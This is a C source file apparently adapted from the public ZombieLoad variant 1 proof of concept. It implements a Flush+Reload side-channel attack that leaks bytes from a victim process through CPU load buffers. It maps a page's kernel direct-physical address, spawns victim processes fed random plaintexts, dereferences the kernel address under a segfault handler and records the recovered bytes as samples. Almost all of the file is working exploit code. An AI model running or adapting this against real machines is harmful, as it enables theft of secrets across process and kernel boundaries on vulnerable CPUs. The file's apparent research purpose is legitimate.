/*
 * Based on
 *   https://github.com/IAIK/ZombieLoad/blob/bcd9c99d5c9164d23d45de584c63a8c92c6662d5/attacker/variant1_linux/main.c
 */

#include "zombieload.h"

// from cacheutils
extern jmp_buf trycatch_buf;

// from main
extern plaintext* plaintexts;
extern sample* samples;
extern size_t num_plaintexts;
extern size_t num_samples;
extern size_t num_samples_per_plaintext;

// probe array
#define MEM_SIZE (NUM_BYTES * 4096)
#if USE_HUGEPAGE_PROBE_ARRAY
	uint8_t* mem;
#else
	uint8_t __attribute__((aligned(4096))) mem[MEM_SIZE];
#endif

int fnr_threshold;
int current_plaintext_idx = -1;
pid_t victim_pid;
size_t sample_counter = 0;

void zombieload_collect_samples_v1() {
	// Determine Flush+Reload Threshold
	fnr_threshold = detect_flush_reload_threshold();
	printf("[ZL] F+R Threshold: %u\n", fnr_threshold);

#if USE_HUGEPAGE_PROBE_ARRAY
	// Allocate probe array on huge pages
	mem = mmap(
		NULL, MEM_SIZE, PROT_READ | PROT_WRITE,
		MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB,
		-1, 0
	);
	if(mem == MAP_FAILED) {
		perror("mmap failed");
		puts("Maybe you have to enable huge pages first?\n\tsudo sysctl -w vm.nr_hugepages=16");
		exit(1);
	}
#endif

	// Initialize and flush probe array
	memset(mem, 0, MEM_SIZE);
	for (size_t i = 0; i < 256; i++) {
		flush(mem + i * 4096);
	}

	// Create a zombieload mapping, i.e. allocate a valid page and find its
	// kernel address in the direct-physical map
	zombieload_mapping mapping = create_mapping();
	
	// set up signal handler
	signal(SIGSEGV, trycatch_segfault_handler);

	// start victim with first plaintext (ID 0)
	victim_pid = start_victim_process();
	
	// collect samples until num_samples is reached
	while(sample_counter < num_samples) {
		// collect samples
		zombieload_sample_v1(mapping, rand() % NUM_POSITIONS, NUM_ITERATIONS_PER_POS);
		// change the plaintext after num_samples_per_plaintext samples
		if ((ssize_t)sample_counter - (ssize_t)((current_plaintext_idx+1) * num_samples_per_plaintext) > 0) {
			printf("[ZL] New plaintext at %zu samples\n", sample_counter);
			kill(victim_pid, SIGTERM);
			victim_pid = start_victim_process();
		}
	}

	// collected enough samples, stop the last victim process and clean up the mapping 
	kill(victim_pid, SIGTERM);
	destroy_mapping(mapping);
#if USE_HUGEPAGE_PROBE_ARRAY
	// unmap probe array
	munmap(mem, MEM_SIZE);
#endif
}

// Helper function to create a zombieload mapping. Returns a zombieload_mapping
// strcture containing two pointers:
//  * mapping: user address
//  * target: kernel address
zombieload_mapping create_mapping() {
	zombieload_mapping m;

	// Get a valid page and its direct physical map address (i.e., a kernel mapping to the page)
	m.mapping = (uint8_t *)mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	memset(m.mapping, 1, 4096);
	size_t paddr = get_physical_address((size_t)m.mapping);
	if (!paddr) {
		printf("[ZL] [!] Could not get physical address! Did you start as root?\n");
		exit(1);
	}
	m.target = (uint8_t *)(get_direct_physical_map() + paddr);

	printf("[ZL] Mapping address: %p\n", m.mapping);
	printf("[ZL] Kernel  address: %p\n", m.target);
	return m;
}

// Unmap a zombieload_mapping
void destroy_mapping(zombieload_mapping m) {
	munmap(m.mapping, 4096);
}

pid_t start_victim_process() {
	// Generate new plaintext
	current_plaintext_idx++;
	plaintexts[current_plaintext_idx].id = current_plaintext_idx;
	char str[(PLAINTEXT_LENGTH*2)+1];
	for (size_t i = 0; i < PLAINTEXT_LENGTH; i++) {
		plaintexts[current_plaintext_idx].bytes[i] = rand();
		snprintf(&str[i*2], 3, "%.2x", plaintexts[current_plaintext_idx].bytes[i]);
	}

	printf("[VI] plaintext.id: %d\n[VI] plaintext.bytes: ", plaintexts[current_plaintext_idx].id);
	for (int i = 0; i < PLAINTEXT_LENGTH; i++) {
		printf("%.2x ", plaintexts[current_plaintext_idx].bytes[i]);
	}
	puts("");

	pid_t pid;
	// Fork. Returns 0 for child, pid of child for parent.
	pid = fork();

	switch (pid) {
	case -1:
		printf("[ZL] Fork (Victim) failed.\n");
		exit(1);
		break;
	case 0:
		printf("[VI] PID: %u\n", getpid());

		// Start victim
		execl(VICTIM_BINARY_PATH, VICTIM_BINARY_PATH, CPU_VICTIM_STR, str, (char*) NULL);
		printf("[VI] Exec failed");
		exit(1);
		break;
	}
	return pid;
}

void zombieload_sample_v1(zombieload_mapping m, size_t register pos, size_t num_iterations) {
#if USE_HUGEPAGE_PROBE_ARRAY
	// make sure the address of the 2MB probe array page is present in the TLB
	// (flush the first element)
	flush(mem);
#endif
	for (size_t register i = 0; i < num_iterations; i++) {
		// Ensure the kernel mapping refers to a value not in the cache
		flush(m.mapping);

		// Dereference the kernel address and encode in LUT
		// Not in cache -> reads load buffer entry
		if (!setjmp(trycatch_buf)) {
			maccess(0);
			maccess(mem + 4096 * m.target[pos]);
		}
		recover(pos);
	}
}

// Recover value from cache (F+R); send result to main process
void recover(uint8_t pos) {
	if (sample_counter >= num_samples) return;

	// Recover the byte value
	// DEBUG: exclude 0x00
	for (size_t i = 0x01; i <= 0xff; i++) {
		// Do a reload + flush sequence.
		// If it's a cache hit...
		if (flush_reload((uint8_t *)mem + 4096 * i, fnr_threshold)) {
			// store sample
			samples[sample_counter].byte = i;
			samples[sample_counter].pos = pos;
			samples[sample_counter].ptid = current_plaintext_idx;
			sample_counter++;
			if (sample_counter >= num_samples) return;
		}
	}
}